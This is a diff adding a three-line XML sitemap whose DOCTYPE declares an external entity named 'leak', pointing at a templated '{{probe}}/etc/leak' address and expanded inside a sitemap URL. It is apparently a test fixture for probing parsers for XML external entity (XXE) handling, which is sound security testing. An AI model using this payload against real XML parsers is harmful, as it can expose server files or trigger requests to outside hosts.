@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE urlset [<!ENTITY leak SYSTEM "{{probe}}/etc/leak">]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://news.corpus.test/&leak;</loc></url></urlset>
